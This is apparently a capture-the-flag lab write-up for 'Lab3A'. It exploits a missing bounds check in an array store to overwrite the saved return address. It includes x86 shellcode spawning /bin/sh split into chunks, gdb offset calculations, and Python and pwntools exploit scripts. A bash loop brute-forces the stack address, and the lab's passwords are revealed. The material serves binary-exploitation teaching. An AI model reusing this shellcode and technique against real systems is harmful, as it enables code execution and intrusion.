## Lab3A

`wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd`

After looking at the source we see that we can store unsigned ints to any index even more than the size of the data buffer as there is no bounds check.
Only 2 conditions need to be satisfied to store the data. 
1. Index shouldn't be a multiple of 3
2. Most significant byte of number should not be 0xb7

This means we have 2*4 = 8 bytes of continuous space to put our shellcode. After that we will need to jump 4 bytes.

Shellcode - 
```
http://shell-storm.org/shellcode/files/shellcode-811.php

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80

```
instruction to jump 4 bytes = `eb 04` (`jmp 0x4`)
Splitting shelllcode in 8 byte chunks

```
31 c0 50 90 90 90 eb 04
68 2f 2f 73 68 90 eb 04
68 2f 62 69 6e 90 eb 04
89 e3 89 c1 89 c2 eb 04
b0 0b cd 80 31 c0 eb 04
40 cd 80 90 90 90 90 90
```
Shellcode as 4 byte unsigned ints. 
```
0x9050c031
0x04eb9090
0x732f2f68
0x04eb9068
0x69622f68
0x04eb906e
0xc189e389
0x04ebc289
0x80cd0bb0
0x90909090
```

Now we know how to place the shellcode. We need to jump to it.
 
```
$ disas main

   0x08048b64 <+338>:   mov    DWORD PTR [esp],eax
   0x08048b67 <+341>:   call   0x8048917 <store_number>
   0x08048b6c <+346>:   mov    DWORD PTR [esp+0x1bc],eax
   0x08048b73 <+353>:   jmp    0x8048bd2 <main+448>
   0x08048b75 <+355>:   mov    DWORD PTR [esp+0x8],0x4
   0x08048b7d <+363>:   mov    DWORD PTR [esp+0x4],0x8048f63
   0x08048b85 <+371>:   lea    eax,[esp+0x1a8]
   0x08048b8c <+378>:   mov    DWORD PTR [esp],eax

$ b *0x08048b67 
```
After hitting the breakpoint we can see the address of data buffer on top of the stack as it is the argument for `store_number`  
address = `0xbffff548`

Next we put a breakpoint on ret instruction in main. After hitting the breakpoint we can see the saved eip address on stack.  
address = `0xbffff6fc`

```
gdb-peda$ p 0xbffff6fc - 0xbffff548
$1 = 0x1b4
```
Difference is of 436 bytes. Therefore index in data buf = 436/4 = 109

Creating the exploit script

```
shellcode = [
    0x90909090, 0x90909090, 0x90909090, 0x90909090,
    0x9050c031, 0x04eb9090, 0x732f2f68, 0x04eb9068,
    0x69622f68, 0x04eb906e, 0xc189e389, 0x04ebc289,
    0x80cd0bb0, 0x90909090
]

input = ""
k=0
for i,j in enumerate(shellcode):
    if (i+1+k)%3 == 0:
        k+=1
    input += "store\n" + st**r(j) + "\n" + str(i+1+k) + "\n"

input += "store\n" + str(0xbffff548) + "\n" + "109\n"
input += "quit\n"

print(input) 
```
```
$ python /tmp/exp.py > /tmp/inp
$ ./lab3A < /tmp/inp
```
Due to env the address of shellcode in gdb did not match when running the program without gdb. After hit and trial for sometime I gave up and wrote the following script.

```
import sys
from pwn import *

shellcode = [
    0x90909090, 0x90909090, 0x90909090, 0x90909090,
    0x9050c031, 0x04eb9090, 0x732f2f68, 0x04eb9068,
    0x69622f68, 0x04eb906e, 0xc189e389, 0x04ebc289,
    0x80cd0bb0, 0x90909090
]


def send_inp(num, pos):
    p.sendline("store")
    p.recv(100)
    p.sendline(num)
    p.recv(100)
    p.sendline(pos)
    print(p.recv(100))

p = process("./lab3A")
p.recv(1000)

k=0
for i,j in enumerate(shellcode):
    if (i+1+k)%3 == 0:
        k+=1
    send_inp(str(j), str(i+1+k))

shelladdr = int(sys.argv[1])
send_inp(str(shelladdr), "109")
p.sendline("quit")
p.interactive()
```

And performed a brute force with a bash loop  
`for (( c=0xbffff500; c<=0xbffff700; c+=4)); do python /tmp/exp.py $c;done`

I found the shelladdr to be  `0xbffff524`

```
$ cat /home/lab3end/.pass
sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps
```
